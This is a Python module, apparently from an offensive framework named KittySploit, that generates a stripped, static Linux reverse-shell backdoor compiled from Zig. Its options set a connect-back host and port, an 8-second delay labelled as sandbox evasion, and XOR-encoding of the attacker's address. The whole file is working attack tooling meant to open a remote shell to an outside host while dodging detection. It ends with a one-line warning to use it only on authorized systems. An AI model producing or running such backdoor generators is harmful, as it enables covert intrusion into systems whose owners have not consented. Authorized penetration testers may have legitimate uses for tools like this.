#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Pure Zig Linux reverse shell with evasion options.

Compiles a static reverse shell (no embedded shellcode) with optional startup
sleep and XOR-encoded LHOST string.
"""

from pathlib import Path

from kittysploit import *
from lib.compile.backdoor_helpers import option_value
from lib.compile.exe import ExeCompiler
from lib.compile.zig_linux_shell import build_zig_linux_shell_source


class Module(Backdoor):
    __info__ = {
        "name": "Zig Linux Reverse Evasion",
        "description": (
            "Generate a Linux x64 reverse shell compiled from pure Zig (no shellcode). "
            "Supports startup sleep delay and XOR-encoded LHOST string."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "session_type": SessionType.SHELL,
        "listener": "listeners/multi/reverse_tcp",
        "references": [
            "https://ziglang.org/",
        ],
    }

    lhost = OptString("127.0.0.1", "Connect-back IP address", True)
    lport = OptPort(4444, "Connect-back TCP port", True)
    sleep = OptInteger(8000, "Sleep milliseconds before connecting (sandbox evasion)", False)
    obfuscate_host = OptBool(True, "XOR-encode LHOST at compile time", False)
    target_arch = OptChoice("x64", "Target architecture", True, ["x64"])
    output_name = OptString("zig_reverse_evasion", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated Zig source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        source = build_zig_linux_shell_source(
            lhost=str(option_value(self, "lhost") or "127.0.0.1"),
            lport=int(option_value(self, "lport") or 4444),
            sleep_ms=int(option_value(self, "sleep") or 0),
            obfuscate_host=bool(option_value(self, "obfuscate_host")),
        )

        out_dir = Path(self.output_dir_path("backdoors/linux/evasion"))
        out_dir.mkdir(parents=True, exist_ok=True)
        bin_name = str(option_value(self, "output_name") or "zig_reverse_evasion").strip()
        elf_path = out_dir / bin_name

        if option_value(self, "save_source"):
            src_path = out_dir / "zig_reverse_evasion.zig"
            src_path.write_text(source, encoding="utf-8")
            print_success(f"Zig source saved: {src_path}")

        compiler = ExeCompiler(framework=getattr(self, "framework", None))
        zig = compiler._get_zig_compiler()
        if not zig.is_available():
            print_error("Zig compiler not available; cannot generate ELF.")
            return False

        ok = zig.compile(
            source_code=source,
            output_path=str(elf_path.resolve()),
            target_platform="linux",
            target_arch="x64",
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
            strip=True,
            static=True,
            extra_args=["-lc"],
        )

        if ok and elf_path.is_file():
            print_success(f"Backdoor ELF generated: {elf_path} ({elf_path.stat().st_size} bytes)")
            print_info(
                f"Connect: {option_value(self, 'lhost')}:{option_value(self, 'lport')} | "
                f"Sleep: {option_value(self, 'sleep')} ms | "
                f"Host obfuscation: {option_value(self, 'obfuscate_host')}"
            )
            print_warning("Use only on authorized systems. Start a matching listener before running the ELF.")
            return True

        print_error("ELF compilation failed. Ensure Zig is installed.")
        return False
